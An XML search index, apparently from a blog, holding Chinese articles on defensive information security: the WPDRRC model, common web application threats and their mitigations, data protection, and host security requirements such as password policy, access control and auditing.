<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[信息安全方针]]></title>
    <url>%2F2019%2F10%2F22%2F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%96%B9%E9%92%88%2F</url>
    <content type="text"><![CDATA[信息安全方针概述信息安全方针是为了加强公司信息安全保障能力，建立健全的信息管理体系，提高整体的网络与信息安全水平，保证网络通信畅通和业务系统正常运营，提高服务质量，指导整个信息安全的工作而制定的信息安全整体策略。]]></content>
  </entry>
  <entry>
    <title><![CDATA[信息安全技术模型]]></title>
    <url>%2F2019%2F10%2F11%2F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E6%A8%A1%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[​ 信息安全模型在信息系统安全建设中起着重要的指导作用，可以精确而形象地描述信息系统的安全属性，准确地描述安全的重要方面与系统行为的关系，能够提高成功实现关键安全需求的理解层次，并且能够从中开发出一套安全性评估准则和关键的描述变量。而信息安全技术模型是信息安全模型的子集，一个好的信息安全模型必然带有一个好的信息安全技术模型。 ​ ISO/OSI 安全体系为信息安全问题的解决提供了一种可行的方法，但其操作性方面与实际情况还有一定差距，特别是在表现技术实现上，对实际工作的指导意义还不够。 ​ 在信息安全工作中，一般采用 PDR （保护、检测和响应） 、PPDR （安全策略、保 护、检测和响应） 、PDRR （保护、检测、响应和恢复） 、MPDRR （管理、保护、检测、 响应和恢复）和到PDRRC 等动态可适应安全模型，来指导信息安全实践活动。WPDRRC模型结构如图所示。 本次建设以WPDRRC模型为基础，来指导信息安全实践活动。 WPDRRC 介绍WPDRRC 模型是我国八六三信息安全专家组提出的适合中国国情的信息系统安全保障体系建设模型，它在模型的前后增加了预警和反击功能，有六个环节和三大要素。六个环节包括预警、保护、检测、响应、恢复和反击，它们具有较强的时序性和动态性，能够较好地反映出信息系统安全保障体系的预警能力、保护能力、检测能力、响应能力、恢复能力和反击能力。三大要素包括人员、策略和技术，人员是核心，策略是桥梁，技术是保证，落实在允六个环节的各个方面，将安全策略变为安全现实。 WPDRRC 模型在实际工作中发挥着日益重要的作用，它所包含的六个环节，其内容如下 : 1） 预警：通过检测等手段，事先掌握系统的脆弱性，了解当前环境的各种威胁和 犯罪趋势，预测未来可能受到的攻击，以及可能承受的损失。 2） 保护：指采取各种手段，来防护信息安全系统， 阻止可以发生攻击的条件的产 生，让攻击者无法顺利地入侵信息系统，以此来减少大多数的入侵事件。 3） 检测：利用各种技术手段和工具， 检测系统中是否存在黑客攻击或者其他可能 影响系统安全的威胁因素，包括可能被攻击者利用的黑客工具、病毒、各种漏洞等。 4） 响应：通过综合手段建立起来的快速响应机制，如报警、跟踪、处理（封堵、 隔离、报告）等，实时阻止已经发生或即将发生的攻击行为， 避免或者减少攻击行为 造成的实际伤害。 5） 恢复：对所有数据进行备份，并采用容错、宛余、和替换、修复和一致性等手段，保证信息系统受到冲击时，能迅速恢复正常运转。 6） 反击：具备一定取证手段，利用各种技术手段和工具， 去发现攻击的线索和证 据，并向有关机构提供相关信息和依据；具备一定打击手段，在法律框架内，依法打击 犯罪和网络恐怖分子。 安全技术的层次结构模型安全技术对信息系统的保护不仅体现在 WPDRRC 的各个环节中，还体现在直接保 护对象的差异上，它体现了不同层次的需求。 按照中国等级保护体系的要求，可以将技术要求分为物理和环境安全、网络和通信安全、设备和计算安全、应用和数据安全等四个层面，其层级结构模型如图所示。同时，等保2.0新增加对安全管理中心的要求。 1）物理和环境安全：是指为了保证信息系统安全可靠地运行，确保信息系统在对信息进 行采集、处理、传输、存储过程中，不至于受到人为或自然因素的危害，而使信息于 失、油露或被破坏，对计算机设备、设施 （包括机房建筑、供电、空调等） 、环境人员、系统等采取适当的安全措施。 2）网络和通信安全：是指网络系统的硬件、软件及其系统中的数据受到保护，不因偶然 的或者恶意的原因而遭受破坏、更改、泄露，系统能连续可靠正常地运行，网络服务不 中断。从而确保网络数据和通信的可用性、完整性和保密性。 3）设备和计算安全：是指通过各种手段，保证主机在数据存储和处理时的保密性、完整性、可用性，它包括硬件、固件、系统软件的自身安全，以及一系列附加的安全技术和 安全管理措施，从而建立一个完整的主机安全保护环境。 4） 应用和数据安全：应用部分指的是保障应用程序使用过程和结果的安全，是针对应用程序或工具在使用过程中可能出现的计算、传输数据的泄露和失窃，通过各种安全工具和手段来消除隐患。数据部分指的是通过采用各种手段，使信息系统正常运行，从而确保所有数据的可用性、完整性和保密性； 其中数据部分还包括备份和恢复等内容，保证信息系统在遭受巨大冲击时，可以及时地恢复数据，恢复正常运行。 5） 安全管理中心：对上述物理和环境安全，网络和通信安全，设备和计算安全， 应用和数据安全的所涉及的设备进行集中管控；对上述设备产生的日志进行集中分析，审计。以应对网络中发生的各类安全事件进行识别、报警和分析。 基于 WPDRRC 的层次技术模型安全技术手段，一方面在 WPDRRC 模型的预警、保护、检测、响应、恢复和反击 六个环节中分别发挥作用；另一方面，从安全技术的保护对象和层次来看，又可以在物理安全、网络安全、主机安全、应用安全和数据安全等五个层面发挥作用。两个维度结合，就能精确地描述出安全技术在整个信息安全中的作用。 信息安全保障的高要求导致大量的安全技术被采用，常用的信息安全技术手段与 WPDRRC 层次模型的对应关系见表 。安全管控中心需要对设备进行集中管控，并对其日志进行集中分析审计。 预防 保护 检测 响应 恢复 反击 物理和环境安全 门禁 物理隔离区 门禁 UPS 防火设备 防水设备 视频监控 烟雾探测 视频监控 容灾中心 （无） 网络和通信安全 漏洞扫描系统 VLAN技术 安全域划分与控制 无线网络安全技术 设备补丁管理 入侵保护 防火墙 VPN WEB应用防火墙 Ddos防御网关 网络准入系统 防病毒网关 入侵检测IDS 入侵防御IPS 异常流量监管系统 网络日志审计 渗透测试 异常流量监测 网络安全运维 网络备份与恢复 双链路 双机热备 IP地址反追踪 流量干扰 证据采集 设备和计算安全 （含终端） 漏洞扫描系统 系统补丁管理 安全加固 入侵保护 病毒防护 防篡改系统 WEB应用防火墙 身份鉴别 访问控制 病毒防护 主机系统审计 数据库审计 渗透测试 网站综合监控 4k平台 病毒防护 应急响应技术 系统备份与恢复 双机热备 服务器集群 证据采集 终端安全管理技术 网络准入 终端安全管理技术 存储介质保护 数据防泄漏 防病毒系统 数据防泄露 防病毒系统 防病毒系统 应急响应技术 （无） 应用和数据安全 渗透测试 源代码安全 检查技术 安全开发 入侵保护 WEB应用防火墙 安保平台 身份鉴别 访问控制 应用漏洞扫描 应用日志审计 渗透测试 应急响应技术 负载均衡 权限控制 反钓鱼技术 证据采集 数据加密管理技术 数据脱敏 网络及主机审计技术适用 应急响应技术 数据备份与恢复 证据采集]]></content>
  </entry>
  <entry>
    <title><![CDATA[应用和数据安全]]></title>
    <url>%2F2019%2F10%2F10%2F%E5%BA%94%E7%94%A8%E5%92%8C%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%2F</url>
    <content type="text"><![CDATA[应用和数据安全是继网络和通信、设备和计算的安全防护之后，信息系统整体防御的重要防线。但应用和数据安全与网络和通信安全，设备和计算安全不同，应用系统一般需要根据业务流程、业务需求由用户定制开发。应用系统安全的实现机制更具有灵活性和复杂性。 应用系统是直接面向最终的用户，为用户提供相关的数据和处理相关信息，因此，它可以提供更多与信息保护相关的功能。 应用和数据安全要求通过应用系统、应用平台系统等实现的安全功能来满足。如果应用系统是多层结构的，一般不同层的应用都需要实现同样强度的身份鉴别，访问控制、安全审计、剩余信息保护及资源控制等，但通信保密性、完整性一般在同一个层面实现。 数据安全与备份恢复有着紧密的联系，在重要的信息系统中，对于备份恢复有着非常高的要求。 应用安全概述应用安全的总体目标是保障支撑业务各类应用的安全，应用安全是业务正常运行的关键。业务与外部交互性越来越高，业务越来越复杂，用来支撑业务的应用也越来越多，应用安全是业务安全的关键环节之一。 数据安全概述数据安全通常有两方面的含义：一是数据本身的安全，主要是指采用现代密码算法对数据进行主动保护，如数据保密、数据完整性、身份双向认证等;二是数据防护的安全，主要采用现代信息存储手段对数据进行主动防护，如通过磁盘阵列、数据备份、异地容灾等手段保证数据的安全。数据安全是一种主动的防护措施，必须依靠可靠、完整的安全技术体系与安全管理体系来实现。 应用安全通用要求应用安全的通用要求包括身份鉴别安全，访问控制安全，安全审计，剩余信息保护，通信完整性、保密性，抗抵赖，软件容错及资源控制。 WEB 应用安全面临的主要威胁随着信息化进程的不断推进，基于 B/S 模式 （即浏览器/服务器模式)的网络信息系统在社会各个领域得到了广泛的应用。WEB 信息系统的依赖性不断增长的同时，在 WEB 信息系统上运作业务的风险和收益也不断增加，使得 WEB 信息系统的数据库中大量数据的安全问题、敏感数据的防窃取和防纂改问题成为信息化管理组织及 WEB 系统开发者们越来越关注的内容。 根据国际国内信息安全组织的统计及从银行业信息安全实际来看，WEB 应用安全面临的威胁主要包括以下方面。 注入攻击注入攻击漏洞，如 SQL，OS 以及 LDAP 注入。这些攻击发生在不可信的数据作为命令或者查询语句的一部分，被发送给解释器的时候。攻击者发送的恶意数据可以欺骗解释器，以执行计划外的命令或者在未被恰当授权时访问数据。 失效的身份认证和会话管理与身份认证和会话管理相关的应用程序功能往往得不到正确的实现，这就导致了攻击者破坏密码、密匙、会话令牌或攻击其他的漏洞去冒充其他用户的身份。 跨站脚本（XSS）当应用程序收到含有不可信的数据，在没有进行适当的验证和转义的情况下，就将它发送给一个网页浏览器，这就会产生跨站脚本攻击（简称 XSS）。XSS允许攻击者在受害者的浏览器上执行脚本，从而劫持用户会话，危害网站，或者将用户转向至恶意网站。 不安全的直接对象引用当开发人员暴露一个对内部实现对象的引用时，例如，一个文件、目录或者数据库密匙，就会产生一个不安全的直接对象引用。在没有访问控制检测或其他保护时，攻击者会操控这些引用去访问未授权的数据。 安全配置错误好的安全需要对应用程序、框架、应用程序服务器、WEB 服务器、数据库服务器 和平台定义和执行安全配置。由于许多设置的默认值并不是安全的，因此，必须定义、 实施和维护这些设置。这包含了对所有的软件保持及时地更新，包括所有应用程序的库 文件。 敏感信息泄漏许多 WEB 应用程序没有正确保护敏感数据，如信用卡、税务 ID和身份验证凭据， 攻击者可能会窃取或自改这些弱保护的数据以进行信用卡诈骗、身份窃取，或其他犯罪。敏感数据值需额外的保护，比如在存放或在传输过程中的加密，以及在与浏览器交换时进行特殊的预防措施。 功能级访问控制缺失大多数 WEB 应用程序的功能在 UI 中可见以前，会先验证功能级别的访问权限。但是，应用程序需要在每个功能被访问时在服务器端执行相同的访问控制检查。如果请求没有被验证，攻击者能够伪造请求以在未经适当授权时具有访问功能。 跨站请求伪造（CSRF）跨站请求伪造 CSRF，是攻击者利用浏览器自动发送会话 Cookie 等认证和凭证，创建恶意的 WEB 页面来产生伪造用户起发的请求，达到攻击目的。CSRF 名称有点类似跨 站脚本（XSS），但攻击方式几乎相左。XSS是利用站点内的信任用户，而 CSRF 则通过伪装来自受信任用户的请求来利用受信任的网站。 使用含有已知漏洞的组件组件，比如库文件、框架和其他软件模块，几乎总是以全部的权限运行。如果一个带有漏洞的组件被利用，这种攻击可以造成更为严重的数据丢失或服务器接管。应用程序使用带有已知漏洞的组件会破坏应用程序防御系统，并使一系列可能的攻击和影响成为可能。 未验证的重定向和转发WEB 应用程序经常将用户重定向和转发到其他网页和网站，并且利用不可信的数据去判定目的页面。如果没有得到适当验证，攻击者可以重定向受害用户到钓鱼软件或恶意网站。 WEB 安全加固随着互联网技术的迅猛发展，许多用户的关键业务越来越多地基于 WEB 应用，在通过浏览器方式实现展现与交互的同时，用户的业务系统所受到的威胁也随之而来，并且随着业务系统的复杂化及互联网环境的变化，所受威胁也在飞速增长。 这4个阶段往往会综合用到以下的 5 个具体方法。 WEB 安全扫描安全检测工作分为 WEB 安全扫描、人工系统分析，在安全扫描中使用专业的 WEB安全扫描评估工具，通过使用工具进行自动扫描和后期的人工整理分析。 渗透性测试渗透性测试采用人工配合工具进行检测，通过真实模拟黑客使用的工具、分析方法来进行实际的漏洞发现和利用，最终得到安全检测结果和解决方案。 安全编码对于跨站、跳转、注入这些漏洞，大多数都是非常简单的不安全编码疏忽所导致的，可以在编码这个阶段通过使用一些安全编码实践来避免。在这个阶段可以提供一些工具的支持，比如静态代码分析，可以分析一些 SQL 注入、跨站脚本，同时可以提供一些脆弱性测试工具。在这个阶段还要进行重审代码，把残留的不安全代码清理掉。 配置层面加固根据安全检测的结果，对 WEB 服务器相关配置进行调整，如对 Apache 进行升级，设置合理的目录的权限，关闭不必要的服务方法等。 木马后门处理对木马文件的常见特征进行研究，并使用木马扫描工具，根据当前的安全规则库，对服务器上的指定目录进行文件的安全扫描，将可疑的文件列出并提供文件查看、删除等操作，避免潜在的安全隐患。 WEB应用架构安全WEB 应用安全的现状及重要性当今世界 ，Internet 已经成为一个非常重要的基础平台。很多企业都将应用架设在该平台上，为客户提供更为方便、快捷的服务支持。这些应用的功能和性能， 都在不断地完善和提高。然而在安全性上，却没有得到足够的重视。 由于网络技术日趋成熟，黑客们也将注意力从以往对网络服务器的攻击逐步转移到了对 WEB 应用的攻击上。然而，绝大多数企业将大量的投资花费在网络和服务器的安全上，没有从真正意义上保证 WEB 应用本身的安全，给黑客以可乘之机， 安全风险达到了前所未有的高度。 一个典型的 WEB 应用通常是标准的三层架构模型：第一层是客户端;使用动态 WEB 内容技术的部分属于中间层; 数据库是第三层。在企业 WEB 应用的各个层面，都会使用不同的技术来确保安全性。为了保护客户端机器的安全，用户会安装防病毒软件; 为了保证用户数据到企业 WEB 服务器的传输安全，通信层通常会使用 SSL（安全套接层)技术加密数据;企业会使用防火墙和IDS/IPS来保证仅允许特定的访问。但是，即便有防病毒保护、防火墙和 IDS/IPS，企业仍然不得不允许一部分的通信经过防火墙，而且 WEB 应用是由软件构成的。那么，它一定会包含 bug，这些 bug 就可以被恶意的用户利用，他们通过执行各种恶意的操作，或者偷窃，或者操控，或者破坏 WEB 应用中的重要信息。只要访问可以顺利通过企业的防火墙，WEB 应用就毫无保留地呈现在用户面前。只有加强 WEB 应用自身的安全，才是真正的 WEB 应用安全解决之道。 常见的WEB 应用漏洞及解决方案WEB 平台软件漏洞WEB 平台软件漏洞包括 WEB 应用使用的操作系统、HTTP 底层服务器软件（如 IIS 或 Apache）和第三方应用程序中的所有程序错误或者可以被利用的漏洞。这个问题也涉及错误配置，包含有不安全的默认设置或管理员没有进行安全配置的应用程序。其解决方案如下： 1）执行严格的双向网络访问控制。 2）找出系统的安全漏洞，及时更新软件的安全补丁。 3）不要在源代码中放置私密信息。 4）禁用 WEB 服务器上不必要的功能，删除不需要的应用程序。 5）定期扫描入侵者。 WEB 认证威胁WEB 认证包括用户名和口令认证、基于令牌和证书的认证及认证服务。攻击者可以通过用户名枚举、密码猜测和窃听等手段来获取用户名和密码;攻击者还可以通过 SQL 注入绕过认证，也可以窃取用户的 Cookie 并访问用户的账户，而不必输入 ID 和口令或进行其他认证。其解决方案如下： 1）使用强健的密码策略和账户锁定策略。 2）采用高强度的证书，如数字证书。证书认证用户时，同时使用公开密钥系统和数字证书。证书认证还可以和其他基于密码的认证机制一起使用，以提供更强健的安全性。 3）使用 HITPS 来保护认证传输，避免受到窃听和重放攻击的风险。 4）输入验证可以防止 SQL 注入、脚本注入和命令执行。 5）确保认证安全令牌，如 Session ID 和 Cookie 等，不会被轻易窃取。 WEB 授权威胁授权能够确定经过认证的用户可以访问应用程序的哪些部分，以及他们在应用程序中可执行哪些操作。攻击者通过爬行访问控制列表（ACL)及分析会话(Session)和 Cookie 中保存的信息来得到非法的授权。其解决方案如下： 1）为应用程序定义明确的、一致的访问策略，配置好用户角色。 2）使用 SSL 加密措施防止攻击。 3）不要在会话中包含个人敏感信息。 4）改变权限要重新生成会话 ID。 非法输入和参数算改漏洞在数据被输入程序前忽略对数据合法性的检验是一个常见的编程漏洞，它导致SQL注入和数据存储攻击、脚本攻击 （包括跨站点脚本攻击）和缓冲区溢出等。 ​ 注入漏洞，特别是 SQL 注入漏洞，主要是利用目标网站程序未对用户输入的字符进行特殊字符过滤或合法性校验，可直接执行数据库语句，导致网站存在安全风险。​ 跨站点脚本（XSS）攻击利用网页及 Cookie 漏洞，攻击者往 WEB 页面里插入恶意 JavaScript 代码 ，当用户浏览该页之时，嵌入其中 WEB 里面的 JavaScript 代码会被执行， 从而达到恶意用户的特殊目的。​ 参数篡改包括操纵 URL 字符串，以检索用户以其他方式得不到的信息。访问 WEB 应用的后端数据库就是通过常常包含在 URL 中的 SQL 调用来进行的。恶意的用户可以操纵 SQL 代码，以便将来有可能检索一份包含所有用户、口令、信用卡号的清单或者储存在数据库中的任何其他数据。其解决方案如下：1）对输入数据采用服务器端验证。2）限制输入字段的长度和数字边界检查以防止缓冲区溢出。3）对 HTML JavaScript 和 SQL 格式中的字符进行编码，如将脚本中的尖括号转化为对应的编码以防止脚本攻击。4）使用正则表达式查找授权或未经授权的内容。5）在应用程序中使用参数来构建查询及尽可能地在数据库中使用存储过程。6）数据库加密。通过表级别和字段级别的加密保护数据。 WEB 应用管理漏洞WEB 应用管理漏洞包括管理员配置错误和开发者错误造成的漏洞，如不必要的 WEB 服务器扩展、直接访问浏览及文件、用户和状态页面信息泄露等。服务器目录浏览是一个不安全的配置，管理员把敏感 log 放在 WEB 目录上，又开放了浏览目录权限，使得黑客直接访问这个目录时，把这些敏感的 log 打开就获取到了明文的用户名、密 码。开发人员常常建立一些后门并依靠调试来排除应用程序的故障，这些安全漏洞经常被留存并放在 Internet 上的最终应用中。一些常见的后门用户不用口令就可以登录或者访问允许直接进行应用配置的特殊URL。其解决方案如下： 1）禁止 IIS 的扩展。 2）保持站点上且录整洁并实行正确的访问控制。 3）提高站点开发者的水平和安全意识。 WEB 客户端攻击通过钓鱼软件、间谍软件和恶意广告对在线用户进行欺诈。钓鱼软件通常以精心设计的虚假网页引诱用户上当，达到盗取银行账号、信用卡号码等目的。虚假网页一般以 eBay 和 PayPal 等大家熟悉的网页为招牌，用户点击链接之后就进入了一个看起来与真实网页极其相似的网页。其解决方案如下： 1）运行防病毒软件及反钓鱼和反间谍软件工具。 2）提高警惕，高度谨慎地处理基于 Internet 的请求和事务。 拒绝服务攻击拒绝服务（DoS）攻击包括计算机网络带宽攻击和连通性攻击。带宽攻击指以极大的通信量冲击网络，使得所有可用网络资源都被消耗殆尽，最后导致合法的用户请求无法通过。连通性攻击指用大量的连接请求冲击计算机，使得所有可用的操作系统资源都被消耗殆尽，最终计算机无法再处理合法用户的请求。其解决方案如下： 1）网络管理员要积极谨慎地维护系统，增强服务器的安全性，确保无安全隐患和漏洞。 2）安装防火墙等安全设备过滤 DoS 攻击。 3）网络管理员应当定期查看安全设备的日志，及时发现对系统的安全威胁行为。 4）在设计 WEB 应用程序时，通过控制用户登录和各种数据处理方式来避免 DoS 攻击。 5）如尽可能不在客户端做数据处理，尽可能从缓存读取数据库等。 不适当的错误处理在进行各种错误的处理操作时，应用程序可能由于其不适当的错误处理在无意中泄露其配置信息、内部运作信息及侵犯隐私的敏感信息。攻击者利用该漏洞可能盗取敏感的数据，甚至发动更为危险的攻击行为。其解决方案如下： 1）使用结构化错误处理，以避免使用软件默认的错误处理器而暴露信息。 2）确定结构化错误处理器，即使代码失败，也可以安全地失败。 应用安全开发软件安全开发的概念始于 20 世纪末 21 世纪初，当时由于病毒猖獗、软件漏洞百出，因软件安全问题导致在现实生活中发生了很多如隐私泄露、资金损失及系统崩溃等安全事件。安全专家由此提出软件安全开发的概念，希望通过在软件开发的各个阶段充分考虑安全因素，来增强软件安全性，并尽量减少软件安全事件的发生。软件的安全性 在众多应用系统中显得尤为重要。 软件安全开发的研究主要从生命周期的角度来开展对安全设计的原则、安全开发的方法、最佳实践和安全专家经验等方面的研究，通过采用各种安全活动以保证得到安全的软件。近十年来，众多软件安全开发生命周期被提出来，比较知名的有微软提出的安全开发生命周期(SDL)、使安全成为软件开发必须的部分(BIS)、综合的轻量级应用安全过程（CLASP)、软件保证成熟度模型(SAMM)等。 应用软件安全的目标是要维护信息资源的保密性、完整性和可用性，以确保业务的成功运作。 WEB 应用安全开发的安全编码规范通常包括以下的检查点: 输入验证、输出编码、身份验证和密码管理、会话管理、访问控制、加密规范、错误处理和日志、数据保护、通信安全、系统配置、数据库安全、文件管理、内存管理、通用编码规范等内容。 应用开发生命周期通常包括 6 个阶段，分别为需求、设计、开发和测试、部署、运维、废弃阶段，应用安全的问题经常表现在部署、运维阶段，但根源在于需求、设计、开发阶段，安全开发需要将信息安全融人上述阶段中。 数据安全内容保密性保密性又称机密性，是指个人或团体的信息不为其他不应该获得者获取到。在现有的信息系统中,大多数软件包括邮件软件、浏览器等，都有保密性相关的设定，用来维护信息的保密性。在现实环境中，数据的保密性面临多种威胁，如间谍软件、黑客等，都是保密性的威胁源。 完整性数据完整性是指在传输、存储信息或数据的过程中，确保信息或数据不被未授权的纂改或在纂改后能够被迅速地发现。在实际的信息系统中，完整性常常和保密性边界混淆。比如加密后的数据在传输过程中被黑客或恶意用户破解，并通过一定的工具修改了密文中的有关数值或信息，数据接收者如果无法校对数据的完整性，会将错误数据进行处理。为解决上述问题，通常会使用数据签名或散列函数对密文进行保护。 可用性数据可用性是一种以使用者为中心的设计概念，可用性设计的重点在于让产品的设计能够符合使用者的习惯与要求，也就是在确保数据保密性和完整性的同时，也要确保数据可以被使用者方便使用，而不能一味强调保密和完整而忽视数据存在的根本意义是被使用和处理。 数据生命周期数据安全问题涉及数据整个生命周期的管理过程，即从创建到失去商业价值或按规定要求被删除。对系统而言，所有的数据在其生命周期中都应当被有效地管理，通过必要的控制手段清晰的界定，以使其避免内部非授权的访问。 数据的生命周期也叫信息的生命周期，一般由创建、保护、访问、迁移、归档、回收/销毁等六阶段组成。 数据安全技术数据加密技术加密是保证数据安全的最核心的手段。加密的基本功能包括：防止未授权者查看机密的数据文件;防止机密数据被泄露或篡改，防止特权用户（如系统管理员）查看私人数据文件; 使入侵者不能轻易地查找一个系统的文件。 此外，数据加密也是确保计算机通信安全的一种重要机制。数据加密可在网络 OSI七层协议的多层上实现，从加密技术应用的逻辑位置看，有 3 种方式： 1）链路加密：通常把网络层以下的加密叫链路加密，主要用于保护通信节点未传输的数据，加解密由置于线路上的密码设备实现。 2）节点加密：是对链路加密的改进。在协议传输层上进行加密，主要是对源节点和目标节点之间传输数据进行加密保护，与链路加密类似，只是加窗算法要结合在依附于节点的加密模件中 ，克服了链路加密在节点处易遭非法存取的缺点。 3）端对端加密：网络层以上的加密称为端对端加密，是面向网络层主体。对应用层的数据信息进行加密，易于用软件实现，且成本低，但密钥管理问题困难，主要适合大型网络系统中信息在多个发方和收方之间传输的情况。 数据存储安全技术服务器中存储的信息是越来越多，而且也越来越重要。为防止服务器受到意外攻击，而导致大量重要的生产业务数据丢失，服务器一般都会采用许多重要的安全保护技术来确保服务器的安全。 自动全备份技术该技术是在网络系统上建立起的两套同样的且同步工作的服务器，如果其中一个出现故障，另一个将立即自动投入系统，接替发生故障的文件服务器的全部工作。使用该技术，可以确保容错系统的数据信息由于系统或人为误操作造成损坏或丢失后，能及时在本地实现数据的快速恢复能力;另外，该技术还可以确保容错系统在发生不可预料或 者抵御的地域性灾难（地震、火灾、机器毁坏等)时，及时在本地或异地实现数据及整个系统的灾难恢复。 事务跟踪技术该技术是针对数据库和多用户软件的需要而设计的，用以保证数据库和多用户应用软件在全部处理工作还没有结束时或工作站或服务器发生突然损坏的情况下，能够保持数据的一致。其工作方式是对指定的事务（操作）要么一次完成，要么什么操作也不进行。 自动检验技术一般来说，在对错误的或者被损坏的数据进行恢复之前，该系统必须要有能力来及时发现这些引起错误的原因，所以一个完整的容错系统应该离不开自动检验技术的支持。自动检验技术是用于故障快速检测的一种有效手段，特别是具有完全自校验性质的自校验装置，它不仅能及时检查出系统模块的差错，还能够检测出自身的差错。在设计一个容错系统时，如果正确地使用自动检验技术，可以大大提高系统对差错的反应能力，使差错的潜伏期缩短，能有效地放置错误的进一步蔓延，从而有利于其他技术及时对错误做出相关的措施。 数据防泄密技术（DLP）DLP 解决方案的类型与防护目标（1）DLP 解决方案的类型：数据泄漏防护（Data Leakage Prevention，DLP）指的是用于监控、发现和保护数据的一组新技术。数据泄漏防护又称为数据泄密防护、数据防泄密技术。目前各种 DLP 解决方案，通常分为 3 种类型 : 1）网络 DLP：通过假设网络设备于主要网络边界之间，最常见的是企业网络和互联网之间，像一个数据网关。网络 DLP 监控通过网关的流量，检测敏感数据或者与之相关的事情，发现异常时，阻止数据离开网络。 2）存储 DLP：通过软件运行在一台设备上或直接运行在文件服务器上，执行类似网络 DLP 的功能。存储 DLP 扫描存储系统寻找敏感数据。发现异常时，可以删除、隔离数据或通知管理员。 3）终端DLP：软件运行在终端系统上监控操作系统活动和应用程序，观察内存和网络流量，以检测使用不当的敏感信息。 （2）DLP 的防护目标：网络 DLP、存储 DLP 和终端 DLP 都有相当的防护作用，也有各自的局限性，最终的解决方案经常是混合使用，来满足以下部分或全部目标： 1）监控：被动监控，报告网络流量和其他信息通信通道，如将文件复制到附加的存储。 2）发现：扫描本地或远程数据存储，对数据存储或终端上的信息进行分类。 3）捕获：捕获异常情况，并存储，以便事后分析和分类，或优化策略。 4）防护/阻塞：根据监控和发现组件的信息，阻止数据传输，或者通过中断网络会话或中断本地代理与计算机交互来阻断信息流。 DLP 解决方案需要混合以上技术，还需要管理配置策略集中服务器，来定义哪些数据需要保护及如何保护。]]></content>
  </entry>
  <entry>
    <title><![CDATA[设备和计算安全]]></title>
    <url>%2F2019%2F10%2F09%2F%E8%AE%BE%E5%A4%87%E5%92%8C%E8%AE%A1%E7%AE%97%E5%AE%89%E5%85%A8%2F</url>
    <content type="text"><![CDATA[计算环境是由服务器、终端/工作站等硬件设备与设备内运行的操作系统、数据库及其他系统软件共同构成。设备和计算包括了操作系统安全、数据库安全、终端安全等相关内容。 设备和计算安全概述主机安全通过操作系统、数据库管理系统及其他安全软件（包括防病毒、防入侵、 木马检测）实现的安全功能来满足。信息系统内的服务器按其功能划分，可分为应用服务器、数据库服务器、网络管理服务器、通信和服务器、文件服务器等。终端可分为管理终端、业务终端、办公终端（PC 终端与智能终端）等。 主机是网络上的单个节点，因此主机安全是分散在各个主机系统上的，不像网络安全可以整体考虑，需要针对不同的用途、操作系统及系统软件来分别解决。 主机安全是指通过各种手段，保证主机在数据存储和处理的保密性、完整性、可用性，它包括硬件、固件、系统软件的自身安全，以及一系列附加的安全技术和安全管理措施，从而建立一个完整的主机安全保护环境。 主机安全的要求主要有： 身份鉴别、访问控制、安全审计、剩余信息保护、入侵防范、恶意代码防范、资源控制。 设备和计算安全保护要求基本要求身份鉴别1）应对登录操作系统和数据库的用户进行身份标识和鉴别，严禁匿名登录。 2）为不同的操作系统和数据库访问用户分配不同的账号并设置不同的初始密码，禁止账号和密码共享。 3）应要求系统的静态密码在 8 位以上，由字母、数字、符号等混合组成。 4）首次登录系统时应强制修改密码，至少每 90 天更改一次密码，不允许提交与上次相同的新密码。 5）在收到用户重置密码的请求后，应先对用户身份进行核实再进行后续操作。 6）应启用登录失败处理功能，可采取结束会话、限制非法登录次数和自动退出等措施； 通过锁定用户的方式限制连续的访问企图（最多不允许超过6 次）。 锁定时间至少设定为 30 分钟或直至管理员为其解锁。 7）应确保对密码进行强效加密保护，不允许明文密码出现。 8）对服务器进行远程管理时，如果数据通过不可信网络传输，应采取加密通信方式，防止认证信息在网络传输过程中被窃听。 9）应采用两种或两种以上的组合鉴别技术对管理用户进行身份鉴别，并且身份鉴别信息至少有一种是不可伪造的，如以密钥证书、动态口令卡、生物特征等作为身份鉴别信息。 10）系统和设备的口令密码设置应在安全的环境下进行，必要时应将口令密码纸质密封交相关部门保管，未经主管领导许可，任何人不得擅自拆阅密封的口令密码，拆阅后的口令密码使用后应立即更改并再次密封存放。 访问控制1）根据“业务必需”原则授予不同用户为完成各自承担任务所需的最小权限，并在它们之间形成相互制约的关系。 2）应根据管理用户的角色（例如，系统管理员、安全管理员、安全审计员等） 分配权限，实现管理用户的权限分离，仅授予管理用户所需的最小权限。 3）应实现操作系统和数据库系统特权用户的权限分离。 4）严格限制默认用户的访问权限，重命名系统默认用户，修改默认用户密码，及时删除多余的、过期的用户及调试用户。 5）严格控制操作系统重要目录及文件的访问权限。 安全审计1）审计范围应覆盖到服务器和管理终端上的每个操作系统用户和数据库用户。 2）审计内容应包括重要用户行为、系统资源的异常使用和重要信息系统命令的使用、账号的创建分配与变更、审计策略的调整、审计系统功能的关闭与启动等系统内重要的安全相关事件。 3）审计记录包括时间、类型、访问者标识、访问对象标识和事件结果，保存时间不少于半年。 4）应根据记录数据进行安全分析，生成审计报表，并及时备份到集中的日志服务器上或难以更改的介质上。 5）应保护审计进程，避免受到未预期的中断。 6）应保护审计记录，避免遭受未授权的删除、修改或覆盖： 只允许具有工作需要的人员查看。 使用文件完整性监视和变更检测软件保护日志，确保已有的日志被改变时产生 报警。 每天复审所有系统的日志。 入侵防范1）应能够检测到对重要服务器进行入侵的行为，包括但不限于主机运行监视、特定进程监控、入侵行为监测和完整性检测等，能够记录和入侵的源 IP、攻击的类型、攻击的目的、攻击的时间，并在发生严重入侵事件时进行警。 2）应能够对重要程序的完整性进行检测，并在检测到完整性受到破坏后具有恢复的措施或在检测到完整性即将受到破坏时进行事前阻断。 3）操作系统应遵循最小安装的原则，仅安装需要的组件和应用程序，禁用所有不必要和不安全的服务和协议，移除所有不必要的功能。 4）应及时对主要服务器进行补丁升级。 5）应严格限制下载和使用免费软件或共享软件，确保服务器系统安装的软件来源可靠，且在使用前进行测试。 